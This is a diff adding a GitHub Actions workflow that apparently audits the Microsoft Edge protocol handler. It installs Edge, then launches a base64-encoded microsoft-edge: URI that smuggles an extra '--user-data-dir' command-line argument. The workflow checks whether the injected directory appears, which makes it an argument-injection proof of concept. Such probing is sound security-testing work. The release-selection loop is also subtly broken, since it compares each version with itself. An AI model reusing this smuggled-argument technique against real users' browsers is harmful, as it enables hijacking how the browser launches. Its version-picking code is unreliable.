@@ -1,0 +1,42 @@
+name: edge-protocol-registration-audit2
+'on':
+  workflow_dispatch:
+    inputs:
+      blob:
+        description: runtime payload
+        required: false
+        default: "bWljcm9zb2Z0LWVkZ2U6aHR0cHM6Ly9jb250b3NvLnRlc3Qvc3RhcnQ/cmVmPWEgLS11c2VyLWRhdGEtZGlyPUM6XFVzZXJzXHJ1bm5lcmFkbWluXERvY3VtZW50c1xjaS1wcm9iZS1hNw=="
+jobs:
+  probe:
+    runs-on: windows-latest
+    timeout-minutes: 30
+    steps:
+    - name: install-latest-stable
+      shell: pwsh
+      continue-on-error: true
+      run: |
+        $j = (Invoke-WebRequest -Uri 'https://edgeupdates.microsoft.com/api/products' -UseBasicParsing -TimeoutSec 60).Content | ConvertFrom-Json
+        $rel = $null
+        foreach ($p in $j) { if ($p.Product -ne 'Stable') { continue }
+          foreach ($r in $p.Releases) { if ($r.Platform -eq 'Windows x64' -or ($r.Platform -eq 'Windows' -and $r.Architecture -eq 'x64')) { if (-not $rel -or [Version]$r.ProductVersion -gt [Version]$r.ProductVersion) { $rel = $r } } } }
+        Write-Host ('target_version=' + $rel.ProductVersion)
+        $art = $rel.Artifacts | Where-Object { $_.ArtifactName -eq 'msi' } | Select-Object -First 1
+        Invoke-WebRequest -Uri $art.Location -OutFile edge.msi -UseBasicParsing -TimeoutSec 900
+        $p2 = Start-Process msiexec.exe -ArgumentList '/i','edge.msi','/quiet','/norestart' -Wait -PassThru
+        Write-Host ('msiexec_exit=' + $p2.ExitCode)
+        Write-Host ('fileversion=' + (Get-Item 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe').VersionInfo.FileVersion)
+    - name: handler-shape-check
+      shell: pwsh
+      run: |
+        $pl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWljcm9zb2Z0LWVkZ2U6aHR0cHM6Ly9jb250b3NvLnRlc3Qvc3RhcnQ/cmVmPWEgLS11c2VyLWRhdGEtZGlyPUM6XFVzZXJzXHJ1bm5lcmFkbWluXERvY3VtZW50c1xjaS1wcm9iZS1hNw=='))
+        Write-Host ('launch_shape_tokens=' + (($pl -split ' ').Count))
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = $pl
+        $psi.UseShellExecute = $true
+        $null = [System.Diagnostics.Process]::Start($psi)
+        Start-Sleep -Seconds 25
+        $ud = 'C:\Users\runneradmin\Documents\ci-probe-a7'
+        Write-Host ('injected_dir_created=' + (Test-Path $ud))
+        Write-Host ('prefs=' + (Test-Path (Join-Path $ud 'Default\Preferences')))
+        Get-CimInstance Win32_Process -Filter "Name='msedge.exe'" | Where-Object { $_.CommandLine -like '*ci-probe-a7*' } | Select-Object -First 2 | ForEach-Object { Write-Host ('CHILD ' + $_.CommandLine.Substring(0, [Math]::Min(200, $_.CommandLine.Length))) }
+        Get-Process msedge -EA SilentlyContinue | Stop-Process -Force
